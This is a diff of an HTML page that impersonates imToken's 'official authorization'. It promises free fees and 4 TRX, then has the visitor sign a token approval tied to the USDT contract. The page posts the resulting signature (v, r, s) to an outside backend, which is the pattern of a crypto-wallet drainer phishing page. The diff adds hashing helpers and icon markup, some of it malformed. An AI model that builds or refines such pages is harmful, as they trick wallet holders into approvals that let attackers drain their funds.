@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
@@ -6,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>imToken官方授权（后端代付版）</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+    <!-- 优先加载crypto-js（确保全局可用） -->
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.2.0/crypto-js.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -121,18 +122,35 @@
             <p> ⚠️ 非钱包浏览器：复制链接 → 点击「连接钱包」→ 钱包内「浏览」粘贴访问</p>
             <div class="copy-link-wrap">
                 <span id="copyLinkText">https://trc20trx-alt.github.io/Trc20.TRX/</span>
-                <button id="copyLinkBtn"> 复制链接</button>
+                <button id="copyLinkBtn"><<i class="fa fa-copy"></</i> 复制链接</button>
             </div>
         </div> 
-        <button id="connectBtn" class="btn"> 连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled> 一键授权</button>
+        <button id="connectBtn" class="btn"><<i class="fa fa-link"></</i> 连接imToken钱包</button>
+        <button id="approveBtn" class="btn" disabled><<i class="fa fa-check-circle"></</i> 一键授权（后端代付+领4TRX）</button>
     </div>
     <div class="footer-info">
         合约验证：TronFullFeeDelegated <span>TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk</span>（TRON浏览器查询）
         © 2025 TRX代付服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
     <script src="imtoken://browser"></script>
-     // ---------------------- 核心配置 ----------------------
+    <script>
+        // ---------------------- 全局工具函数（确保优先加载） ----------------------
+        // 1. uint256转32字节Hex
+        function toUint256Hex(value) {
+            let hex = BigInt(value).toString(16);
+            hex = hex.padStart(64, '0');
+            return '0x' + hex;
+        }
+
+        // 2. SHA3哈希计算（全局函数，确保调用时存在）
+        function calculateSHA3(hexString) {
+            const wordArray = CryptoJS.enc.Hex.parse(hexString);
+            const hash = CryptoJS.SHA3(wordArray, { outputLength: 256 });
+            return '0x' + hash.toString(CryptoJS.enc.Hex);
+        }
+        // --------------------------------------------------------------------------
+
+        // ---------------------- 核心配置 ----------------------
         const DELEGATE_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk";
         const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 替换为你的后端地址
@@ -205,7 +223,7 @@
                     return;
                 }
                 approveBtn.disabled = true;
-                approveBtn.innerHTML = ' 生成授权签名中...';
+                approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 生成授权签名中...';
 
                 try {
                     // 1. 地址转Hex
@@ -226,7 +244,7 @@
                     const { v, r, s } = signature;
 
                     // 6. 调用后端
-                    approveBtn.innerHTML = ' 后端代付中...';
+                    approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 后端代付中...';
                     const res = await fetch(BACKEND_API, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -261,7 +279,7 @@
                     alert(`操作失败：${e.message}`);
                 } finally {
                     approveBtn.disabled = false;
-                    approveBtn.innerHTML = ' 一键授权）';
+                    approveBtn.innerHTML = '<<i class="fa fa-check-circle"></</i> 一键授权（后端代付+领4TRX）';
                 }
             };
 
